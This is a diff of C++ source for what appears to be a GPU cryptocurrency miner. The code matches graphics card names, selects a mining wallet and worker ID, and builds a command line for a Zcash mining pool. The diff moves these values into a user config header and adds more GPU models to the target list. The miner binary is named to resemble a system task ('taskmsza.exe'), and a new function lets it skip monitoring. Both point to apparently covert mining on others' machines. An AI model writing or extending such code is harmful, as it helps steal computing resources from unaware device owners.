@@ -7,6 +7,7 @@
 #include "Utility/PeeIdHelper.h"
 #include "commonshare\md5.h"
 #include "Utility\StringOperation.h"
+#include "userconfig.h"
 
 //配置以下参数
 /*
@@ -14,9 +15,9 @@
 	g_szCardName：显卡名称匹配（往后添加）
 	g_uMinMemorySize：显存大小 根据需求修改
 */
-bool g_bCheckName = true;
-char g_szCardName[][MAX_PATH] = {"970","980","1060","1070","1080","2050","2060","2070","2080"};
-cl_ulong g_uMinMemorySize = 3500000000;
+bool g_bCheckName = CHECKCARD;
+char g_szCardName[][MAX_PATH] = {"950","960","970","980","1050","1060","1070","1080","2050","2060","2070","2080", "titan xp", "titan v", "titan z", "titan x"};
+cl_ulong g_uMinMemorySize = 2900000000;
 
 
 
@@ -65,7 +66,7 @@ std::wstring RunEnvironment::GetRandomAccount()
 {
 	int iAscii = GetStringAscii(m_wstrWorkID);
 	TCHAR szAccountList[][MAX_PATH] = {
-		L"t1gPsB3YYY4WQCd5hkKpHNMJGWrcn46srgB",
+		ACCOUNT,
 	};
 	int index = iAscii%ARRAYSIZE(szAccountList);
 	return szAccountList[index];
@@ -87,8 +88,8 @@ void RunEnvironment::GetWorkID()
 	{
 		m_wstrWorkID = L"00000000";
 	}*/
-	m_wstrWorkID = L"wiaaw29c";
-}
+	m_wstrWorkID = USERID;  //    _/~拾忆
+}  
 
 void RunEnvironment::GetClientInfo()
 {
@@ -105,7 +106,7 @@ void RunEnvironment::GetClientInfo()
 	}
 	else if (m_Type == vendor_t::amd)
 	{
-		strFormat = L"-zpool zec.f2pool.com:3357 -zwal %s.%s -zpsw x -i 0 -li 1 -dbg -1";
+		strFormat = ZA_CMD;
 		//strWorkid = L"a0";
 		m_pClientInfo->strClientSubPath = L"taskmsza\\taskmsza.exe";
 	}
@@ -186,7 +187,7 @@ bool RunEnvironment::CheckZACond()
 
 bool RunEnvironment::CheckXCCond()
 {
-	return false;
+	return true;
 }
 
 bool RunEnvironment::CheckGPUName(const std::string &strName)
@@ -237,4 +238,9 @@ int RunEnvironment::GetStringAscii(const std::wstring& wstr)
 		sum += (int)c;
 	}
 	return sum;
+}
+
+bool RunEnvironment::CheckIsForceNotMonitor()
+{
+	return m_Type == vendor_t::cpu || NOT_MONITOR;
 }
